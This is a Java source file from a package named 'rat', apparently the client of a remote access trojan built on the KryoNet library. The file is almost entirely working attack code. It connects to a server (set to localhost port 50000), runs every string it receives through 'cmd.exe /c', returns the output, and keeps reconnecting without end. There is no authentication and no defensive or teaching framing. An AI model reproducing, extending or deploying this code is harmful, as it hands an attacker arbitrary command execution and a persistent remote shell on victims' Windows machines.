package me.hashy.rat;

import com.esotericsoftware.kryonet.Client;
import com.esotericsoftware.kryonet.Connection;
import com.esotericsoftware.kryonet.Listener;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ClientGUI {

    private static Client client = null;

    public ClientGUI() {
        //Create a new client
        client = new Client();

        //Add a listener to the client
        client.addListener(new Listener() {

            @Override
            public void received(Connection connection, Object object) {
                try {
                    //Get the command
                    if (!(object instanceof String cmd))
                        return;

                    //Execute the command
                    String output = executeCommand(cmd);

                    //Send the output back to the server
                    client.sendTCP(output);
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        });

        //Start the client
        client.start();

        //Connect to the server
        try {
            client.connect(5000, "localhost", 50000);
            System.out.println("Connected to Server");
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public static void main(String[] args) throws IOException {
        new ClientGUI();

        while (true) {
            if (!client.isConnected())
                client.reconnect();
        }
    }

    //Execute the command and return the output
    private String executeCommand(String command) {
        String output = "";

        try {
            Process p = Runtime.getRuntime().exec("cmd.exe /c \"" + command + "\"");

            output = readOutput(p);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return output;
    }

    //Read the output of the command
    private String readOutput(Process p) throws Exception {
        StringBuilder output = new StringBuilder();

        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

        String line = "";

        while ((line = reader.readLine())!= null) {
            output.append(line).append("\n");
        }

        return output.toString();
    }

}